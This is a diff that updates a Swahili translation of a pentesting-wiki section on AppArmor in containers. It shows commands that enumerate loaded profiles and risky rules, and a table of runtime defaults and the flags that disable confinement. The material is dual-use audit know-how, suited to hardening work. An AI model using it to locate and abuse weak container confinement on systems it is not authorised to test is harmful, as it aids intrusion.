@@ -198,31 +235,30 @@ find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side 
 cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
+
 Kinachovutia hapa:
 
-- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload haifaidi confinement ya AppArmor.
-- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile katika runtime config kwa kiasi kikubwa ni la mapambo tu.
-- Ikiwa `docker inspect` inaonyesha `unconfined` au custom profile isiyotarajiwa, mara nyingi hiyo ndiyo sababu filesystem au mount-based abuse path inafanya kazi.
-- Ikiwa `/sys/kernel/security/apparmor/profiles` haina profile uliyotarajia, runtime au orchestrator configuration pekee haitoshi.
-- Ikiwa profile inayodaiwa kuwa hardened ina rules za mtindo wa `ux`, `change_profile` pana, `userns`, au `flags=(complain)`, boundary ya kiutendaji inaweza kuwa dhaifu zaidi kuliko jina la profile linavyopendekeza.
+- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload haipati ulinzi wa AppArmor.
+- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile kwenye runtime config ni la mwonekano tu.
+- Ikiwa `docker inspect` inaonyesha `unconfined` au profile maalum usiyoitarajia, mara nyingi hiyo ndiyo sababu njia ya matumizi mabaya inayotegemea filesystem au mount inafanya kazi.
+- Ikiwa `/sys/kernel/security/apparmor/profiles` haina profile uliyotarajia, config ya runtime au orchestrator pekee haitoshi.
+- Ikiwa profile inayodaiwa kuwa ngumu ina sheria za aina ya `ux`, `change_profile` pana, `userns`, au `flags=(complain)`, mpaka halisi wa usalama unaweza kuwa dhaifu zaidi kuliko jina la profile linavyodokeza.
 
-Ikiwa container tayari ina privileges zilizoinuliwa kwa sababu za kiutendaji, kuacha AppArmor ikiwa imewezeshwa mara nyingi hutofautisha kati ya exception inayodhibitiwa na security failure pana zaidi.
+Ikiwa container tayari ina privileges za juu kwa sababu za kiutendaji, kuacha AppArmor ikiwa imewashwa mara nyingi ndiko kunakotofautisha isipokuwa linalodhibitiwa na hitilafu pana zaidi ya usalama.
 
-## Runtime Defaults
+## Mipangilio Chaguomsingi ya Runtime
 
-| Runtime / platform | Hali ya kawaida | Tabia ya kawaida | Udhaifu wa kawaida wa mwongozo |
+| Runtime / platform | Hali chaguomsingi | Tabia chaguomsingi | Kudhoofisha kwa mikono kunakotokea mara nyingi |
 | --- | --- | --- | --- |
-| Docker Engine | Huwezeshwa kwa kawaida kwenye hosts zinazoweza kutumia AppArmor | Hutumia AppArmor profile ya `docker-default` isipokuwa ibadilishwe | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Podman | Hutegemea host | AppArmor inaungwa mkono kupitia `--security-opt`, lakini default halisi hutegemea host/runtime na si ya jumla kama profile ya `docker-default` iliyoandikwa kwa Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Kubernetes | Default ya masharti | Ikiwa `appArmorProfile.type` haijabainishwa, default ni `RuntimeDefault`, lakini hutumika tu AppArmor ikiwa imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` yenye profile dhaifu, nodes zisizo na msaada wa AppArmor |
-| containerd / CRI-O under Kubernetes | Hufuata msaada wa node/runtime | Runtimes zinazotumiwa na Kubernetes kwa kawaida huunga mkono AppArmor, lakini enforcement halisi bado hutegemea msaada wa node na mipangilio ya workload | Sawa na safu ya Kubernetes; runtime configuration ya moja kwa moja pia inaweza kuruka AppArmor kabisa |
+| Docker Engine | Imewezeshwa kwa chaguomsingi kwenye host zinazotumia AppArmor | Hutumia AppArmor profile ya `docker-default` isipobadilishwa | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Podman | Hutegemea host | AppArmor inatumika kupitia `--security-opt`, lakini chaguomsingi halisi hutegemea host/runtime na si ya jumla kama profile ya `docker-default` iliyoandikwa kwenye nyaraka za Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Kubernetes | Chaguomsingi hutegemea hali | Ikiwa `appArmorProfile.type` haijabainishwa, chaguomsingi ni `RuntimeDefault`, lakini hutumika tu AppArmor ikiwa imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` yenye profile dhaifu, node zisizotumia AppArmor |
+| containerd / CRI-O chini ya Kubernetes | Hufuata usaidizi wa node/runtime | Runtime zinazoungwa mkono na Kubernetes kwa kawaida hutumia AppArmor, lakini utekelezaji halisi bado hutegemea usaidizi wa node na mipangilio ya workload | Kama ilivyo kwenye safu ya Kubernetes; config ya moja kwa moja ya runtime pia inaweza kuruka AppArmor kabisa |
 
-Kwa AppArmor, variable muhimu zaidi mara nyingi ni **host**, si runtime pekee. Mpangilio wa profile katika manifest hauundi confinement kwenye node ambayo AppArmor haijawezeshwa.
+Kwa AppArmor, kigezo muhimu zaidi mara nyingi ni **host**, si runtime pekee. Mipangilio ya profile kwenye manifest haiundi ulinzi kwenye node ambayo AppArmor haijawezeshwa.
 
-## Marejeo
+## References
 
-- [1] [Kubernetes security context: sehemu za AppArmor profile na tabia ya msaada wa node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
-- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, na profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
-- [3] [HTB: Nunchucks - AppArmor shebang bypass yenye Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)
-
+- [1] [Muktadha wa usalama wa Kubernetes: sehemu za AppArmor profile na tabia ya usaidizi wa node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
+- [2] [Ukurasa wa `apparmor.d(5)` wa Ubuntu 24.04: mabadiliko ya exec, `change_profile`, `userns`, na bendera za profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
 {{#include ../../../../banners/hacktricks-training.md}}
